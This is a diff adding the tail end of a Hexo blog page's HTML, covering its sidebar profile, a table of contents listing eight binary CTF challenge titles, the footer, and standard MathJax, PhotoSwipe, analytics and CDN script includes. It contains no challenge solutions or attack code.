+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目1：bin"><span class="toc-number">1.</span> <span class="toc-text">题目1：bin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目2：bin1"><span class="toc-number">2.</span> <span class="toc-text">题目2：bin1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目3：bin2-原题是OJ的smashes"><span class="toc-number">3.</span> <span class="toc-text">题目3：bin2(原题是OJ的smashes)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目4：bin3（原题是hgame的week2的Steins）"><span class="toc-number">4.</span> <span class="toc-text">题目4：bin3（原题是hgame的week2的Steins）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目5：bin4"><span class="toc-number">5.</span> <span class="toc-text">题目5：bin4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目6-bin5"><span class="toc-number">6.</span> <span class="toc-text">题目6:bin5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目7-bin6"><span class="toc-number">7.</span> <span class="toc-text">题目7 bin6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目8"><span class="toc-number">8.</span> <span class="toc-text">题目8</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
